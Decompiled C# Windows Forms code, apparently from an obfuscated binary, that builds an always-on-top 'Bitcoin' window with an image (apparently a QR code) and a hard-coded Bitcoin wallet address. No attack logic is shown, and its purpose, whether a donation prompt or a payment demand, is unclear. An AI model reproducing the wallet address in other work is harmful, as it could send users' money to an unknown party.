﻿// Token: 0x02000027 RID: 39
public partial class Bitcoin : global::System.Windows.Forms.Form
{
	// Token: 0x06000158 RID: 344 RVA: 0x00010074 File Offset: 0x0000E274
	private void InitializeComponent()
	{
		this.pictureBox1 = new global::System.Windows.Forms.PictureBox();
		this.textBox1 = new global::System.Windows.Forms.TextBox();
		((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		base.SuspendLayout();
		this.pictureBox1.BackgroundImageLayout = global::System.Windows.Forms.ImageLayout.Center;
		this.pictureBox1.Image = global::Class89.Bitmap_46;
		this.pictureBox1.Location = new global::System.Drawing.Point(34, 14);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new global::System.Drawing.Size(250, 250);
		this.pictureBox1.SizeMode = global::System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 0;
		this.pictureBox1.TabStop = false;
		this.textBox1.BackColor = global::System.Drawing.Color.White;
		this.textBox1.Font = new global::System.Drawing.Font("Tahoma", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
		this.textBox1.Location = new global::System.Drawing.Point(34, 282);
		this.textBox1.Name = "textBox1";
		this.textBox1.ReadOnly = true;
		this.textBox1.Size = new global::System.Drawing.Size(250, 21);
		this.textBox1.TabIndex = 1;
		this.textBox1.Text = "16QzTKEVVzVfsZksqcyS7VY1ek41NHx1za";
		this.textBox1.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
		base.AutoScaleDimensions = new global::System.Drawing.SizeF(96f, 96f);
		base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Dpi;
		this.BackColor = global::System.Drawing.Color.White;
		base.ClientSize = new global::System.Drawing.Size(318, 325);
		base.Controls.Add(this.textBox1);
		base.Controls.Add(this.pictureBox1);
		base.MaximizeBox = false;
		this.MaximumSize = new global::System.Drawing.Size(334, 360);
		base.MinimizeBox = false;
		this.MinimumSize = new global::System.Drawing.Size(334, 360);
		base.Name = "Bitcoin";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Bitcoin";
		base.TopMost = true;
		((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	// Token: 0x040000B6 RID: 182
	private global::System.Windows.Forms.PictureBox pictureBox1;

	// Token: 0x040000B7 RID: 183
	private global::System.Windows.Forms.TextBox textBox1;
}
